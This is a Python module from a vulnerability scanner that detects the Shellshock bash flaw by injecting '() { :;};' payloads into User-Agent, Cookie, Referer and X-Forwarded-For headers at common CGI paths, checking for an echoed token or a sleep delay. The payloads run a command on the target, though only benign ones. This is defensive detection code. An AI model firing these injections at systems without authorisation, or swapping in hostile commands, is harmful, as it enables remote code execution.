"""
cyberm4fia-scanner - Shellshock (CVE-2014-6271 / 6277 / 7169) Scanner

Detects bash environment-variable RCE via CGI-like endpoints. Older
finding but still appears in legacy embedded devices, internal admin
panels, and outdated bastion boxes.

CVE references: CVE-2014-6271, CVE-2014-7169, CVE-2014-6277,
CVE-2014-6278, CVE-2014-7186. Public PoCs from CVE database.

Detection strategy
------------------
* Inject the classic ``() { :;}; <cmd>`` sequence into request headers
  (User-Agent, Cookie, Referer) and the URL path query.
* Look for command-execution side-channels:
    - shellshock-id echo in the body (`echo X-Shellshock-Probe: <id>`)
    - long delay (sleep-based)
* Multiple variants per CVE; first hit wins per target.

Independent reimplementation; the bash trigger string is the CVE PoC,
not copyrightable expression.
"""

from __future__ import annotations

import time
import uuid
from urllib.parse import urljoin

from utils.colors import log_info, log_success
from utils.request import BlockedTargetPath, ScanExceptions, smart_request


# Common CGI/script paths likely to be wired through bash. Any 200 OK
# from these is enough to make the probes worth sending.
_CGI_PATHS = (
    "/cgi-bin/test.cgi",
    "/cgi-bin/test-cgi",
    "/cgi-bin/printenv",
    "/cgi-bin/login",
    "/cgi-bin/admin.cgi",
    "/",
)


# Header names the request usually flows through bash via mod_cgi.
_INJECTABLE_HEADERS = ("User-Agent", "Referer", "Cookie", "X-Forwarded-For")


def _echo_payload(token: str) -> str:
    """A reflective Shellshock payload that echoes a marker to stdout
    (visible in CGI body) and to a header (visible to clients)."""
    marker = f"X-Shellshock-Probe: {token}"
    return f"() {{ :;}}; echo; echo \"{marker}\"; /bin/echo '{token}'"


def _sleep_payload(seconds: int = 5) -> str:
    return f"() {{ :;}}; /bin/sleep {seconds}"


def _is_echo_hit(response, token: str) -> bool:
    if response is None:
        return False
    body = getattr(response, "text", "") or ""
    if token in body:
        return True
    headers = getattr(response, "headers", None) or {}
    for name, value in headers.items():
        if "shellshock-probe" in str(name).lower() and token in str(value):
            return True
    return False


def _try_echo(target: str, header: str, delay: float) -> dict | None:
    token = uuid.uuid4().hex[:12]
    payload = _echo_payload(token)
    try:
        resp = smart_request("get", target, delay=delay,
                             headers={header: payload})
    except (ScanExceptions, BlockedTargetPath):
        return None
    if _is_echo_hit(resp, token):
        return {
            "type": "Shellshock",
            "url": target,
            "vector": f"header:{header}",
            "payload": payload,
            "evidence": f"Token '{token}' reflected — bash interpreted env-var prefix.",
            "severity": "Critical",
            "confidence": 95,
            "module": "shellshock",
            "cve": "CVE-2014-6271",
        }
    return None


def _try_sleep(target: str, header: str, delay: float, sleep_s: int = 5) -> dict | None:
    payload = _sleep_payload(sleep_s)
    start = time.monotonic()
    try:
        resp = smart_request("get", target, delay=delay,
                             headers={header: payload}, timeout=sleep_s + 5)
    except (ScanExceptions, BlockedTargetPath):
        return None
    elapsed = time.monotonic() - start
    # Allow 0.5s slack for normal latency. Don't fire if we got nothing.
    if resp is not None and elapsed >= sleep_s - 0.5:
        return {
            "type": "Shellshock",
            "url": target,
            "vector": f"header:{header}",
            "payload": payload,
            "evidence": f"Time-based: response delayed {elapsed:.1f}s "
                        f"(expected ~{sleep_s}s) on bash sleep payload.",
            "severity": "Critical",
            "confidence": 80,
            "module": "shellshock",
            "cve": "CVE-2014-6271",
        }
    return None


def scan_shellshock(url: str, *, paths: list[str] | None = None,
                    delay: float = 0.0, try_sleep: bool = False) -> list[dict]:
    """Probe a target for Shellshock at well-known CGI paths.

    ``try_sleep`` is opt-in because it adds 5s per probe — only enable
    when the echo-based test came back empty and you suspect WAF
    stripping of the marker.
    """
    candidate_paths = paths if paths is not None else list(_CGI_PATHS)
    log_info(f"🐚 Shellshock: {len(candidate_paths)} path × "
             f"{len(_INJECTABLE_HEADERS)} header on {url[:60]}")

    findings: list[dict] = []
    seen_targets: set[str] = set()

    for path in candidate_paths:
        target = urljoin(url, path)
        for header in _INJECTABLE_HEADERS:
            finding = _try_echo(target, header, delay)
            if finding is None and try_sleep:
                finding = _try_sleep(target, header, delay)
            if finding and target not in seen_targets:
                seen_targets.add(target)
                log_success(f"  ✅ Shellshock at {target} via {header}")
                findings.append(finding)
                break  # one hit per target is enough
    return findings
